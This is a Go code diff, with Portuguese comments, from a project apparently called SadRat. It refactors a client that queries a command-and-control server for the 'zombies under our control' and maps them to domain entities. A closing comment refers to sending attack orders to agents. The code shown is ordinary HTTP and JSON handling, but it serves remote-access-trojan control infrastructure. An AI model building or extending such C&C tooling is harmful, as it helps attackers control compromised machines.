@@ -6,6 +6,7 @@ import (
 	"errors"
 	"net/http"
 	"time"
+	"github.com/VitorDie/SadRat/internal/domain"
 	"github.com/VitorDie/SadRat/internal/dto"
 )
 
@@ -30,35 +31,40 @@ func NewClientHTTP(serverURL string) *ClientHTTP {
 }
 
 // RequestAvailableAgents bate no C&C e busca todos os zumbis sob nosso controle
-func (c *ClientHTTP) RequestAvailableAgents() ([]dto.AgentUsedByClientDTO, error) {
-	// 1. Monta a URL da nossa API
+func (c *ClientHTTP) RequestAvailableAgents() ([]domain.AgentEntity, error) {
 	url := c.serverURL + "/api/agents"
 
-	// 2. Prepara a requisição GET
 	req, err := http.NewRequest(http.MethodGet, url, nil)
 	if err != nil {
 		return nil, err
 	}
 
-	// 3. Dispara a requisição para o Servidor C&C
 	resp, err := c.httpClient.Do(req)
 	if err != nil {
 		return nil, err
 	}
 	defer resp.Body.Close()
 
-	// 4. Valida se o servidor autorizou a requisição
 	if resp.StatusCode != http.StatusOK {
 		return nil, errors.New("falha ao buscar agentes no C&C, status: " + resp.Status)
 	}
 
-	// 5. Lemos o JSON com a lista de zumbis e convertemos para o nosso DTO (Slice de Agent)
-	var agents []dto.AgentUsedByClientDTO
-	if err := json.NewDecoder(resp.Body).Decode(&agents); err != nil {
+	// 1. Lemos o array de DTOs da rede
+	var agentsDTO []dto.AgentUsedByClientDTO
+	if err := json.NewDecoder(resp.Body).Decode(&agentsDTO); err != nil {
 		return nil, err
 	}
 
-	return agents, nil
+	// 2. MAPEAMENTO: Convertemos DTOs para Entidades de Domínio
+	var agentsDomain []domain.AgentEntity
+	for _, a := range agentsDTO {
+		agentsDomain = append(agentsDomain, domain.AgentEntity{
+			ID: a.ID,
+		})
+	}
+
+	// 3. Retornamos a lista de entidades puras!
+	return agentsDomain, nil
 }
 
 // SendCommand envia a ordem de ataque para o C&C agendar na fila do Agente
